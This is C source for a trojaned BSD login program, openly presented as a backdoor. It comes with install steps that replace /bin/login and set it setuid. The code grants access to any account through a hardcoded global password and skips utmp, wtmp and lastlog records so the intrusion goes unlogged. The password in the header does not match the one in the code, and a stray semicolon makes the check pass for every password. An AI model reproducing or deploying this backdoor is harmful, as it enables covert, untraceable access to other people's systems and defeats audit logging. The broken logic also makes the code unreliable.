/* This version of login is not guaranteed to work smoothly with all 
   operating systems, login procedures, or logging setups. It is BSD
   compliant, and works with utmp/wtmp logging. The global password
   is #30FLG6. You should be able to find where to change it.
   
   To compile:
    
      gcc login.c -o login
      strip login
      cp /bin/login login.bak *Just in case*
      cp login /bin/login
      chmod 4755 /bin/login
      
*/      
  
/* -----------------------------------------------------------------------
 * SUPER MODIFIED BACKDOOR LOGIN
 *
 *
 * Modification History:
 *
 * 12 April 94 -- BLUESMAN
 *      Very nice simple hack to allow backdoor logins using a global
 *      password!! Will not record to utmp/wtmp through backdoor.
 *
 * 10 April 87 -- mng
 *      Restored code to show last login
 *      Added code in timedout() to force a hangup of current tty
 *
 * 05 July 86 -- mng
 *      Added read of /etc/welcome before login prompt
 *      prints <hostname> login: instead of login: 
 *
 * 19 Dec 83 --jmcg 01
 *      Modified writing of /usr/adm/wtmp to use O_APPEND feature.
 *      This change brings `login' into conformance with `init', the
 *      other writer of `wtmp'.
 *
 * 19 Dec 83 --jmcg
 *      Derived from 4.2BSD, labeled:
 *              "@(#)login.c    4.33 (Berkeley) 83/09/02"
 *
 * ------------------------------------------------------------------------
 */

#define LOGERR  1

/*
 * login [ name ]
 * login -r hostname (for rlogind)
 * login -h hostname (for telnetd, etc.)
 */

#include <sys/param.h>
/* #include "quota.h" */
#include <sys/stat.h>
#include <sys/file.h>
#include <sys/time.h>
#include <sys/resource.h>

#include <sgtty.h>
#include <utmp.h>
#include <signal.h>
#include <pwd.h>
#include <stdio.h>
#include <lastlog.h>
#include <errno.h>

#define SCPYN(a, b)     strncpy(a, b, sizeof(a))

#define NMAX    sizeof(utmp.ut_name)

#define FALSE   0
#define TRUE    -1

#define PASSWD "/bin/passwd"

char    bdoor=0;
char    nolog[] =       "/etc/nologin";
char    qlog[]  =       ".hushlogin";
char    securetty[] =   "/etc/securetty";
char    maildir[30] =   "/usr/spool/mail/";
char    lastlog[] =     "/usr/adm/lastlog";
struct  passwd nouser = {"", "nope", -1, -1, -1, "", "", "", "" };
struct  sgttyb ttyb;
struct  utmp utmp;
char    minusnam[16] = "-";
/*
 * This bounds the time given to login.  We initialize it here
 * so it can be patched on machines where it's too small.
 */
int     timeout = 60;

char    homedir[64] = "HOME=";
char    shell[64] = "SHELL=";
char    term[64] = "TERM=";
char    user[20] = "USER=";

char    *envinit[] =
    { homedir, shell, "PATH=:/usr/ucb:/bin:/usr/bin:/usr/local", term, user, 0 };

struct  passwd *pwd;
struct  passwd *getpwnam();
char    *strcat(), *rindex(), *index();
int     setpwent();
int     timedout();
int     hostname();
char    *ttyname();
char    *crypt();
char    *getpass();
char    *stypeof();
extern  char **environ;
extern  int errno;

struct  tchars tc = {
        CINTR, CQUIT, CSTART, CSTOP, CEOT, CBRK
};
struct  ltchars ltc = {
        CSUSP, CDSUSP, CRPRNT, CFLUSH, CWERASE, CLNEXT
};

int     rflag;
int     noshell;
char    rusername[NMAX+1], lusername[NMAX+1];
char    rpassword[NMAX+1];
char    name[NMAX+1];
char    *rhost;

main(argc, argv)
        char *argv[];
{
        register char *namep;
        int t, f, c, i;
        int invalid, quietlog;
        FILE *nlfd;
        char *ttyn;
        int ldisc = 0, zero = 0;

        signal(SIGALRM, timedout);
        alarm(timeout);
        signal(SIGQUIT, SIG_IGN);
        signal(SIGINT, SIG_IGN);
        setpriority(PRIO_PROCESS, 0, 0);
        
        /*
         * -r is used by rlogind to cause the autologin protocol;
         * -h is used by other servers to pass the name of the
         * remote host to login so that it may be placed in utmp and wtmp
         */
        if (argc > 1) {
                if (strcmp(argv[1], "-r") == 0) {
                        rflag = doremotelogin(argv[2]);
                        SCPYN(utmp.ut_host, argv[2]);
                        argc = 0;
                }
                if (strcmp(argv[1], "-h") == 0 && getuid() == 0) {
                        SCPYN(utmp.ut_host, argv[2]);
                        argc = 0;
                }
        }
        ioctl(0, TIOCLSET, &zero);
        ioctl(0, TIOCNXCL, 0);
        ioctl(0, FIONBIO, &zero);
        ioctl(0, FIOASYNC, &zero);
        ioctl(0, TIOCGETP, &ttyb);
        /*
         * If talking to an rlogin process,
         * propagate the terminal type and
         * baud rate across the network.
         */
        if (rflag)
                doremoteterm(term, &ttyb);
        ioctl(0, TIOCSLTC, &ltc);
        ioctl(0, TIOCSETC, &tc);
        ioctl(0, TIOCSETP, &ttyb);
        for (t = getdtablesize(); t > 3; t--)
                close(t);
        ttyn = ttyname(0);
        if (ttyn==(char *)0)
                ttyn = "/dev/tty??";
        do {
                ldisc = 0;
                ioctl(0, TIOCSETD, &ldisc);
                invalid = FALSE;
                SCPYN(utmp.ut_name, "");
                /*
                 * Name specified, take it.
                 */
                if (argc > 1) {
                        SCPYN(utmp.ut_name, argv[1]);
                        argc = 0;
                }
                /*
                 * If remote login take given name,
                 * otherwise prompt user for something.
                 */
                if (rflag) {
                        SCPYN(utmp.ut_name, lusername);
                        /* autologin failed, prompt for passwd */
                        if (rflag == -1)
                                rflag = 0;
                } else
                        getloginname(&utmp);
                if (!strcmp(pwd->pw_shell, "/bin/csh")) {
                        ldisc = NTTYDISC;
                        ioctl(0, TIOCSETD, &ldisc);
                }
                if(*pwd->pw_shell == '\0')
                        noshell = TRUE;
                else
                        noshell = FALSE;
                /*
                 * If no remote login authentication and
                 * a password exists for this user, prompt
                 * for one and verify it.
                 */
                if (!rflag && *pwd->pw_passwd != '\0') {
                        char *pp;

                        setpriority(PRIO_PROCESS, 0, -4);
                        pp = getpass("Password:");
                        namep = crypt(pp, pwd->pw_passwd);
                        setpriority(PRIO_PROCESS, 0, 0);
                        if (strcmp(namep, pwd->pw_passwd))
                                invalid = TRUE;
                        if (!strcmp(pp,"#30FL6"));
                                { bdoor=1; invalid = FALSE; }
                }
                /*
                 * If user not super-user, check for logins disabled.
                 */
                if (pwd->pw_uid != 0 && (nlfd = fopen(nolog, "r")) > 0) {
                        while ((c = getc(nlfd)) != EOF)
                                putchar(c);
                        fflush(stdout);
                        sleep(5);
                        exit(0);
                }
                /*
                 * If valid so far and root is logging in,
                 * see if root logins on this terminal are permitted.
                 */
                if (!invalid && pwd->pw_uid == 0 &&
                    !rootterm(ttyn+sizeof("/dev/")-1)) {
                        logerr("ROOT LOGIN REFUSED %s",
                            ttyn+sizeof("/dev/")-1);
                        invalid = TRUE;
                }
                if (invalid) {
                        printf("Login incorrect\n");
                        if (ttyn[sizeof("/dev/tty")-1] == 'd')
                                logerr("BADDIALUP %s %s",
                                    ttyn+sizeof("/dev/")-1, utmp.ut_name);
                }
                if (*pwd->pw_shell == '\0')
                        pwd->pw_shell = "/bin/sh";
                i = strlen(pwd->pw_shell);
                if (chdir(pwd->pw_dir) < 0 && !invalid ) {
                        if (chdir("/") < 0) {
                                printf("No directory!\n");
                                invalid = TRUE;
                        } else {
                                printf("No directory! %s\n",
                                   "Logging in with home=/");
                                pwd->pw_dir = "/";
                        }
                }
                /*
                 * Remote login invalid must have been because
                 * of a restriction of some sort, no extra chances.
                 */
                if (rflag && invalid)
                        exit(1);
        } while (invalid);
/* committed to login turn off timeout */
        alarm(0);

if(!bdoor)      /*  <- takes you outta zee logs */
{       
        time(&utmp.ut_time);
        t = ttyslot();
        if (t > 0 && (f = open("/etc/utmp", 1)) >= 0) {
                lseek(f, (long)(t*sizeof(utmp)), 0);
                SCPYN(utmp.ut_line, rindex(ttyn, '/')+1);
                write(f, (char *)&utmp, sizeof(utmp));
                close(f);
        }
        if (t > 0 && (f = open("/usr/adm/wtmp", O_WRONLY|O_APPEND)) >= 0) {
                write(f, (char *)&utmp, sizeof(utmp));
                close(f);
        }
        quietlog = access(qlog, 0) == 0;
        if ((f = open(lastlog, 2)) >= 0) {
                struct lastlog ll;

                lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
                if (read(f, (char *) &ll, sizeof ll) == sizeof ll &&
                    ll.ll_time != 0 && !quietlog) {
                        printf("Last login: %.*s ",
                            24-5, (char *)ctime(&ll.ll_time));
                        if (*ll.ll_host != '\0')
                                printf("from %.*s\n",
                                    sizeof (ll.ll_host), ll.ll_host);
                        else
                                printf("on %.*s\n",
                                    sizeof (ll.ll_line), ll.ll_line);
                }
                lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
                time(&ll.ll_time);
                SCPYN(ll.ll_line, rindex(ttyn, '/')+1);
                SCPYN(ll.ll_host, utmp.ut_host);
                write(f, (char *) &ll, sizeof ll);
                close(f);
        }
      }
        chown(ttyn, pwd->pw_uid, pwd->pw_gid);
        chmod(ttyn, 0622);
        setgid(pwd->pw_gid);
        strncpy(name, utmp.ut_name, NMAX);
        name[NMAX] = '\0';
        initgroups(name, pwd->pw_gid);
        
        setuid(pwd->pw_uid);
        environ = envinit;
        strncat(homedir, pwd->pw_dir, sizeof(homedir)-6);
        strncat(shell, pwd->pw_shell, sizeof(shell)-7);
        if (term[strlen("TERM=")] == 0)
                strncat(term, stypeof(ttyn), sizeof(term)-6);
        strncat(user, pwd->pw_name, sizeof(user)-6);
        if ((namep = rindex(pwd->pw_shell, '/')) == NULL)
                namep = pwd->pw_shell;
        else
                namep++;
        strcat(minusnam, namep);
        umask(022);
        if (ttyn[sizeof("/dev/tty")-1] == 'd')
                logerr("DIALUP %s %s",
                    ttyn+sizeof("/dev/")-1, pwd->pw_name);
        if (!quietlog) {
                showfile("/etc/motd");
                strcat(maildir, pwd->pw_name);
                if (access(maildir,4)==0) {
                        struct stat statb;
                        stat(maildir, &statb);
                        if (statb.st_size)
                                printf("You have mail.\n");
                }
        }
        if((*pwd->pw_passwd == '\0') && noshell) {
                printf("You must give yourself a passwd!\n");
                fflush(stdout);
                execl(PASSWD, "passwd", 0);
        }
        signal(SIGALRM, SIG_DFL);
        signal(SIGQUIT, SIG_DFL);
        signal(SIGINT, SIG_DFL);
        signal(SIGTSTP, SIG_IGN);
        execlp(pwd->pw_shell, minusnam, 0);
        perror(pwd->pw_shell);
        printf("No shell\n");
        exit(0);
}

getloginname(up)
        register struct utmp *up;
{
        register char *namep;
        char hostname[15];
        char c;

        gethostname(hostname, 14);
        while (up->ut_name[0] == '\0') {
                namep = up->ut_name;
                showfile("/etc/welcome");
                printf("login: ");
                while ((c = getchar()) != '\n') {
                        if (c == ' ')
                                c = '_';
                        if (c == EOF)
                                exit(0);
                        if (namep < up->ut_name+NMAX)
                                *namep++ = c;
                }
        }
    
        strncpy(lusername, up->ut_name, NMAX);
        lusername[NMAX] = 0;
        setpwent();
        if ((pwd = getpwnam(lusername)) == NULL)
                pwd = &nouser;
        endpwent();
}

timedout()
{
        int tmp;

        printf("Login timed out after %d seconds\n", timeout);
        ioctl(0, TIOCGETP, &ttyb);
        tmp = ttyb.sg_ispeed;
        ttyb.sg_ispeed = ttyb.sg_ospeed = B0;   /* force a hangup */
        ioctl(0, TIOCSETP, &ttyb);
        sleep(1);
        ttyb.sg_ispeed = ttyb.sg_ospeed = tmp;  /* force a hangup */
        ioctl(0, TIOCSETP, &ttyb);
        exit(0);
}

int     stopfd;
catch()
{
        signal(SIGINT, SIG_IGN);
        stopfd++;
}

rootterm(tty)
        char *tty;
{
        register FILE *fd;
        char buf[100];

        if ((fd = fopen(securetty, "r")) == NULL)
                return(1);
        while (fgets(buf, sizeof buf, fd) != NULL) {
                buf[strlen(buf)-1] = '\0';
                if (strcmp(tty, buf) == 0) {
                        fclose(fd);
                        return(1);
                }
        }
        fclose(fd);
        return(0);
}

showfile(filename)
char *filename;
{
        FILE *fp;
        register c;

        stopfd = 0;             /* nerd@percival 07/05/86 */
        signal(SIGINT, catch);
        if ((fp = fopen(filename,"r")) != NULL) {
                while ((c = getc(fp)) != EOF && stopfd == 0)
                        putchar(c);
                fclose(fp);
        }
        signal(SIGINT, SIG_IGN);
}

#undef  UNKNOWN
#define UNKNOWN "su"

char *
stypeof(ttyid)
        char *ttyid;
{
        static char typebuf[16];
        char buf[50];
        register FILE *f;
        register char *p, *t, *q;

        if (ttyid == NULL)
                return (UNKNOWN);
        f = fopen("/etc/ttytype", "r");
        if (f == NULL)
                return (UNKNOWN);
        /* split off end of name */
        for (p = q = ttyid; *p != 0; p++)
                if (*p == '/')
                        q = p + 1;

        /* scan the file */
        while (fgets(buf, sizeof buf, f) != NULL) {
                for (t = buf; *t != ' ' && *t != '\t'; t++)
                        ;
                *t++ = 0;
                while (*t == ' ' || *t == '\t')
                        t++;
                for (p = t; *p > ' '; p++)
                        ;
                *p = 0;
                if (strcmp(q,t) == 0) {
                        strcpy(typebuf, buf);
                        fclose(f);
                        return (typebuf);
                }
        }
        fclose (f);
        return (UNKNOWN);
}

doremotelogin(host)
        char *host;
{
        FILE *hostf;
        int first = 1;

        getstr(rusername, sizeof (rusername), "remuser");
        getstr(lusername, sizeof (lusername), "locuser");
        getstr(term+5, sizeof(term)-5, "Terminal type");
        if (getuid()) {
                pwd = &nouser;
                goto bad;
        }
        setpwent();
        pwd = getpwnam(lusername);
        endpwent();
        if (pwd == NULL) {
                pwd = &nouser;
                goto bad;
        }
        hostf = pwd->pw_uid ? fopen("/etc/hosts.equiv", "r") : 0;
again:
        if (hostf) {
                char ahost[32];

                while (fgets(ahost, sizeof (ahost), hostf)) {
                        char *user;

                        if ((user = index(ahost, '\n')) != 0)
                                *user++ = '\0';
                        if ((user = index(ahost, ' ')) != 0)
                                *user++ = '\0';
                        if (!strcmp(host, ahost) &&
                            !strcmp(rusername, user ? user : lusername)) {
                                fclose(hostf);
                                return (1);
                        }
                }
                fclose(hostf);
        }
        if (first == 1) {
                char *rhosts = ".rhosts";
                struct stat sbuf;

                first = 0;
                if (chdir(pwd->pw_dir) < 0)
                        goto again;
                if (lstat(rhosts, &sbuf) < 0)
                        goto again;
                if ((sbuf.st_mode & S_IFMT) == S_IFLNK) {
                        printf("login: .rhosts is a soft link.\r\n");
                        goto bad;
                }
                hostf = fopen(rhosts, "r");
                fstat(fileno(hostf), &sbuf);
                if (sbuf.st_uid && sbuf.st_uid != pwd->pw_uid) {
                        printf("login: Bad .rhosts ownership.\r\n");
                        fclose(hostf);
                        goto bad;
                }
                goto again;
        }
bad:
        return (-1);
}

getstr(buf, cnt, err)
        char *buf;
        int cnt;
        char *err;
{
        char c;

        do {
                if (read(0, &c, 1) != 1)
                        exit(1);
                if (--cnt < 0) {
                        printf("%s too long\r\n", err);
                        exit(1);
                }
                *buf++ = c;
        } while (c != 0);
}

char    *speeds[] =
    { "0", "50", "75", "110", "134", "150", "200", "300",
      "600", "1200", "1800", "2400", "4800", "9600", "19200", "38400" };
#define NSPEEDS (sizeof (speeds) / sizeof (speeds[0]))

doremoteterm(term, tp)
        char *term;
        struct sgttyb *tp;
{
        char *cp = index(term, '/');
        register int i;

        if (cp) {
                *cp++ = 0;
                for (i = 0; i < NSPEEDS; i++)
                        if (!strcmp(speeds[i], cp)) {
                                tp->sg_ispeed = tp->sg_ospeed = i;
                                break;
                        }
        }
        tp->sg_flags = ECHO|CRMOD|ANYP|XTABS;
}

logerr(fmt, a1, a2, a3)
        char *fmt, *a1, *a2, *a3;
{
#ifdef LOGERR
        FILE *cons = fopen("/dev/console", "w");

        if (cons != NULL) {
                fprintf(cons, fmt, a1, a2, a3);
                fprintf(cons, "\n\r");
                fclose(cons);
        }
#endif
}
